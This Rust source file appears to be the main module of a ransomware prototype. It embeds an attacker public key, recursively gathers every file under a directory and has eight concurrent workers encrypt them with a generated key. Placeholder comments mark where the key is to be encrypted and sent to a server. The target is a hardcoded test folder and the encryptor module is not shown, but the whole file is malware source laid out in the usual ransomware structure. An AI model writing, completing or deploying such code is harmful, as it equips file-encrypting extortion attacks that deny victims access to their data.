use std::fs::DirEntry;
use std::path::PathBuf;
use std::vec::Vec;

use zeroize::Zeroize;

mod encryptor;

const _THREADS: i32 = 8;

#[cfg(unix)]
const PUB_KEY: &[u8] = include_bytes!("../pub.key");

#[cfg(windows)]
const PUB_KEY: &[u8] = include_bytes!("..\\pub.key");

fn recurse_directory(path: PathBuf) -> Option<Vec<DirEntry>> {
    let mut files = Vec::new();
    if path.read_dir().is_err() {
        return None;
    }
    for file in path.read_dir().unwrap() {
        if file.is_err() {
            continue;
        }
        let file = file.unwrap();

        if file.path().is_dir() {
            let new_files = recurse_directory(file.path());
            if let Some(mut recursed) = new_files {
                files.append(&mut recursed);
            }
        } else if file.path().is_file() {
            files.push(file);
        }
    }
    return Some(files);
}

#[tokio::main]
async fn main() {
    let mut key = encryptor::generate_key();
    println!("Hello, world!");

    let files = recurse_directory(PathBuf::from("/home/kobiske/Videos/Test Folder/"));
    if files.is_none() {
        return;
    }
    let files = files.unwrap();

    let (s, r) = crossbeam_channel::unbounded();
    for file in files {
        let _ = s.send(file);
    }
    let mut threads = Vec::new();

    for _ in 0.._THREADS {
        let thread_reciever = r.clone();
        let thread_key = key.clone();
        threads.push(tokio::spawn(async move {
            encryptor::encrypt_files(thread_reciever, thread_key).await;
        }));
    }

    for thread in threads {
        let _ = thread.await;
    }
    // encrypt key here

    // send key to server here

    key.zeroize();
}
